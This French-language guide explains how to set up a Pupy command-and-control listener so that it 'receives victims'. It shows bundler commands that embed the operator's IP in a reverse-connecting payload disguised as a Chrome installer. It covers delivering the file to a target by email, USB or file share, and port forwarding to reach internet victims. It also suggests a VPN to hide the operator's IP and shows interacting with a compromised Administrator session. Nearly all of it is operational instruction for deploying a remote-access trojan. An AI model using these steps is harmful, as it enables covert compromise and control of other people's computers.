# 🎯 Guide Complet: Configurer le Listener pour Recevoir les Victimes

## 📋 Vue d'ensemble

Quand vous créez un payload .exe avec votre bundler, vous spécifiez:
```
IP: 0.0.0.0
Port: 4444
```

Mais qu'est-ce que cela signifie réellement? Et comment recevoir les victimes?

---

## 🔍 Comprendre IP et Port

### Qu'est-ce que `0.0.0.0`?

```
0.0.0.0 = "Écouter sur TOUTES les interfaces réseau"

Exemple:
├─ 192.168.1.100 (WiFi)
├─ 10.0.0.5 (Ethernet)
├─ 127.0.0.1 (localhost)
└─ Et autres interfaces...

✅ 0.0.0.0 = Écouter PARTOUT
```

### Qu'est-ce que le Port `4444`?

```
Port = "La porte par laquelle les données entrent"

Analogie:
┌─ Votre ordi = Immeuble
├─ IP = Adresse de l'immeuble
├─ Port = Numéro d'appartement
└─ 0.0.0.0:4444 = "Tous les appartements au port 4444"

Port 4444 dans votre bundler
└─ Les victimes se connectent À VOUS sur le port 4444
```

---

## 🎯 Configuration Correcte du Listener

### Étape 1: Identifier Votre IP Réelle

Vous avez plusieurs adresses IP. Laquelle utiliser?

#### Sur macOS - Trouver Votre IP

```bash
# Méthode 1: Voir toutes les interfaces
ifconfig

# Résultat typique:
# en0 (WiFi):
#     inet 192.168.1.100 netmask 0xffffff00 broadcast 192.168.1.255

# en1 (Ethernet):
#     inet 10.0.0.50 netmask 0xffffff00 broadcast 10.0.0.255

# lo0 (Loopback - LOCAL ONLY):
#     inet 127.0.0.1
```

```bash
# Méthode 2: Juste votre IP WiFi (simple)
ifconfig | grep "inet " | grep -v 127.0.0.1

# Résultat:
# inet 192.168.1.100 netmask 0xffffff00 broadcast 192.168.1.255
```

```bash
# Méthode 3: Votre IP publique (Internet externe)
curl ifconfig.me

# Résultat: 203.45.67.89 (par exemple)
```

---

## 🎬 Scénario 1: Tester Localement (Sur Votre Mac)

### ✅ Configuration pour Test Local

```
Listener IP: 127.0.0.1 ou 0.0.0.0
Listener Port: 4444
```

#### Pourquoi?
```
Vous testez sur VOTRE MACHINE
├─ Le payload s'exécute sur votre Mac
├─ Le listener écoute aussi sur votre Mac
├─ Pas besoin d'internet
└─ Parfait pour développement/test
```

#### Comment Configurer?

**Dans votre bundler, mettez:**
```bash
python3.12 src/cross_platform_bundler.py \
    /path/to/payload.exe \
    windows \
    127.0.0.1 \
    4444 \
    2
```

**Ou avec 0.0.0.0:**
```bash
python3.12 src/cross_platform_bundler.py \
    /path/to/payload.exe \
    windows \
    0.0.0.0 \
    4444 \
    2
```

#### Lancer le Listener (Pupy C2)

```bash
# Terminal 1: Lancer le listener Pupy
cd /chemin/vers/pupy
python2 pupysh.py --host 0.0.0.0 --port 4444

# Résultat attendu:
# [*] Listening on 0.0.0.0:4444
# [*] Waiting for client connections...
```

```bash
# Terminal 2: Lancer le payload
./payload.exe

# Résultat attendu:
# [*] Connection from 127.0.0.1
# [+] New client connected!
```

---

## 🎬 Scénario 2: Tester sur Machine Virtuelle (Windows VM)

### Configuration pour VM

```
Listener IP: 192.168.1.100 (votre IP WiFi macOS)
Listener Port: 4444
```

#### Pourquoi cette IP?

```
VM sur VirtualBox
├─ VM a sa propre IP: 192.168.1.150 (par exemple)
├─ VM doit se connecter À VOUS (macOS)
├─ Donc elle se connecte à: 192.168.1.100:4444
└─ Votre macOS écoute à: 192.168.1.100:4444
```

#### Schéma Réseau

```
┌─────────────────────────────────────┐
│ Mon Réseau: 192.168.1.0/24          │
├─────────────────────────────────────┤
│                                     │
│ macOS (Hôte)                        │
│ IP: 192.168.1.100                   │
│ Listener: 0.0.0.0:4444              │
│          ↑                          │
│       ÉCOUTE                        │
│          ↑                          │
│          │                          │
│      Connection de VM               │
│          ↓                          │
│ Windows VM (Guest)                  │
│ IP: 192.168.1.150                   │
│ Payload: Connecte à 192.168.1.100:4444
│                                     │
└─────────────────────────────────────┘
```

#### Configuration Étape-par-Étape

**1. Trouver votre IP macOS:**

```bash
ifconfig | grep "inet " | grep -v 127
# Résultat: inet 192.168.1.100
```

**2. Configurer le bundler avec votre IP:**

```bash
python3.12 src/cross_platform_bundler.py \
    /path/to/payload.exe \
    windows \
    192.168.1.100 \
    4444 \
    2
```

**3. Transférer le .exe à la VM**

**4. Lancer le listener sur macOS:**

```bash
# Terminal macOS:
python2 pupysh.py --host 0.0.0.0 --port 4444

# Résultat:
# [*] Listening on 0.0.0.0:4444
# [*] Waiting for client connections...
```

**5. Lancer le .exe dans la VM Windows:**

```bash
# PowerShell Windows VM:
.\ChromeSetup_20251101_183240.exe

# Résultat attendu:
# [5 secondes de timing delay...]
# [Tentative de connexion à 192.168.1.100:4444]
# [Connexion établie!]
```

**6. Voir la connexion sur le listener:**

```bash
# Terminal macOS (listener):
# [*] Connection from 192.168.1.150
# [+] New Windows client connected!
# [+] ID: 1
# [+] Hostname: WIN-TESTVM
```

---

## 🎬 Scénario 3: Tester sur Vrai Ordinateur Cible (Réseau Interne)

### Configuration pour Réseau Interne

```
Listener IP: 192.168.1.100 (votre IP WiFi)
Listener Port: 4444
```

#### Pourquoi?

```
Vous avez un ordinateur cible sur le même réseau:
├─ Votre macOS: 192.168.1.100
├─ Ordinateur cible: 192.168.1.60
├─ Même réseau WiFi/Ethernet
└─ Ils peuvent se parler directement
```

#### Comment Faire?

**1. Trouver votre IP:**

```bash
# macOS Terminal:
ifconfig | grep "inet " | grep -v 127
# inet 192.168.1.100
```

**2. Bundler le payload avec VOTRE IP:**

```bash
python3.12 src/cross_platform_bundler.py \
    /path/to/payload.exe \
    windows \
    192.168.1.100 \
    4444 \
    2
```

**3. Copier le .exe à l'ordinateur cible**

```bash
# Option A: Email
# Option B: Clé USB
# Option C: SMB Share
# Option D: HTTP Server
```

**4. Lancer le listener sur votre macOS:**

```bash
python2 pupysh.py --host 0.0.0.0 --port 4444
```

**5. Exécuter le .exe sur l'ordinateur cible**

**6. Recevoir la connexion:**

```bash
# macOS listener:
[*] Connection from 192.168.1.60
[+] New client connected!
```

---

## 🌐 Scénario 4: Cible sur Internet (Réseau Externe)

### ⚠️ Configuration Avancée - Utiliser IP Publique

```
Listener IP: Votre IP Publique (ex: 203.45.67.89)
Listener Port: 4444
```

#### Attention: C'est Avancé!

```
Cela nécessite:
✓ Port forwarding sur votre routeur
✓ Ouvrir le port 4444 vers votre macOS
✓ IP publique stable (ou utiliser No-IP)
✓ Vérifier les pare-feu
✓ Vérifier les lois locales
```

#### Trouver Votre IP Publique

```bash
# Terminal macOS:
curl ifconfig.me

# Résultat: 203.45.67.89 (par exemple)
```

#### Configurer le Port Forwarding

```
1. Ouvrir l'interface du routeur
   └─ Généralement: 192.168.1.1 ou 192.168.0.1

2. Aller à: Port Forwarding (ou Redirection de Ports)

3. Créer une règle:
   ├─ Protocol: TCP
   ├─ External Port: 4444
   ├─ Internal IP: 192.168.1.100 (votre macOS)
   ├─ Internal Port: 4444
   └─ Sauvegarder

4. Vérifier le port est ouvert:
   └─ https://www.canyouseeme.org (test de port)
```

#### Bundler avec IP Publique

```bash
# Trouver votre IP publique:
curl ifconfig.me
# → 203.45.67.89

# Bundler:
python3.12 src/cross_platform_bundler.py \
    /path/to/payload.exe \
    windows \
    203.45.67.89 \
    4444 \
    2
```

---

## 📊 Tableau Récapitulatif

| Scénario | Listener IP | Port | Réseau | Test |
|----------|-------------|------|--------|------|
| **Test Local** | 127.0.0.1 | 4444 | Aucun | ✅ Facile |
| **Test VM** | 192.168.1.100 | 4444 | Local | ✅ Moyen |
| **Ordinateur Local** | 192.168.1.100 | 4444 | Local | ✅ Moyen |
| **Internet** | 203.45.67.89 | 4444 | Public | ⚠️ Avancé |

---

## 🛡️ Sécuriser Votre Listener

### ✅ Bonnes Pratiques

```
1. Firewall
   ├─ Bloquer le port 4444 sauf de sources de confiance
   └─ Ne pas ouvrir publiquement sans raison

2. VPN
   ├─ Utiliser un VPN pour cacher votre IP
   ├─ Particulièrement si sur internet public
   └─ Recommandé: ExpressVPN, ProtonVPN

3. Connexion SSH
   ├─ Tunel SSH pour sécuriser la connexion
   └─ ssh -L 4444:localhost:4444 user@remote

4. HTTPS/TLS
   ├─ Chiffrer les communications
   ├─ Certificats SSL/TLS
   └─ Voir configuration Pupy avancée

5. Authentification
   ├─ Ajouter mot de passe au listener
   └─ Tokens/API keys
```

---

## 🔧 Configurer le Listener dans Pupy

### Lancer Pupy avec Listener Personnalisé

```bash
# Terminal macOS:

# Basique (toutes les interfaces):
python2 pupysh.py --host 0.0.0.0 --port 4444

# Spécifique (une interface):
python2 pupysh.py --host 192.168.1.100 --port 4444

# Avec authentification:
python2 pupysh.py --host 0.0.0.0 --port 4444 --password monmotdepasse

# Avec certificat SSL:
python2 pupysh.py --host 0.0.0.0 --port 4444 --ssl \
    --cert /path/to/cert.pem --key /path/to/key.pem
```

---

## 📝 Exemple Complet: Test VM

### Étape 1: Trouver votre IP

```bash
$ ifconfig | grep "inet " | grep -v 127
inet 192.168.1.100 netmask 0xffffff00 broadcast 192.168.1.255
```

### Étape 2: Bundler le Payload

```bash
$ python3.12 src/cross_platform_bundler.py \
    /Users/kalilbelgoumri/Pupy_Outputs/payload.exe \
    windows \
    192.168.1.100 \
    4444 \
    2

[+] SUCCESS! Bundled for Windows
[+] Payload configured for: 192.168.1.100:4444
[+] Output: /Users/kalilbelgoumri/Pupy_Outputs/dist/Payload_20251101_120000.exe
```

### Étape 3: Lancer le Listener

```bash
$ python2 pupysh.py --host 0.0.0.0 --port 4444

[*] Listening on 0.0.0.0:4444
[*] Waiting for client connections...
[*] Pupy console ready
pupy>
```

### Étape 4: Transférer à VM et Exécuter

```
[Depuis Windows VM]
C:\Users\Test> Payload_20251101_120000.exe

[5 secondes de timing delay...]
[Tentative de connexion à 192.168.1.100:4444...]
```

### Étape 5: Voir la Connexion

```bash
$ python2 pupysh.py --host 0.0.0.0 --port 4444

[*] Listening on 0.0.0.0:4444
[*] Waiting for client connections...

[*] Connection from 192.168.1.150!
[+] New client connected!
[+] ID: 1
[+] Hostname: WIN-TESTVM
[+] Username: Administrator

pupy> clients
[*] Clients:
[*] 1: WIN-TESTVM\Administrator

pupy> interact 1
[*] Interacting with client 1
[*] Connected to WIN-TESTVM\Administrator
[*] Running commands...
```

---

## ⚠️ Erreurs Courantes & Solutions

### Erreur 1: "Connection refused"

```
Cause: Listener pas en écoute
Solution:
1. Vérifier listener lancé
2. Vérifier port 4444 correct
3. Vérifier firewall n'est pas bloquant
```

### Erreur 2: "Host unreachable"

```
Cause: IP payload ne peut pas atteindre listener
Solution:
1. Vérifier IP de listener correcte
2. Vérifier même réseau
3. Vérifier firewall permit connexion
```

### Erreur 3: "Timeout after 30 seconds"

```
Cause: Listener IP/Port incorrects dans le payload
Solution:
1. Rebundler avec bonne IP
2. Vérifier adresse écrite correctement
3. Tester connectivité: ping 192.168.1.100
```

### Erreur 4: "Port 4444 already in use"

```
Cause: Un autre processus utilise le port
Solution:
# Trouver ce qui utilise le port:
lsof -i :4444

# Tuer le processus:
kill -9 <PID>

# Ou utiliser un autre port:
python2 pupysh.py --host 0.0.0.0 --port 5555
```

---

## 🎓 Résumé

```
Pour recevoir vos victimes:

1. Identifier votre IP (ifconfig)

2. Bundler le payload avec votre IP:
   python3.12 src/cross_platform_bundler.py \
       /path/payload \
       windows \
       VOTRE_IP \
       4444 \
       2

3. Lancer le listener:
   python2 pupysh.py --host 0.0.0.0 --port 4444

4. Exécuter le payload sur la cible

5. Attendre la connexion

6. Recevoir la victime! 🎉
```

---

## 📚 Ressources

- Pupy C2: https://github.com/n1nj4sec/pupy
- Port Forwarding: https://portforward.com/
- Test Port: https://www.canyouseeme.org
- IP Publique: https://ifconfig.me

---

**Date**: 1 novembre 2025  
**Version**: 1.0  
**Statut**: ✅ Complet
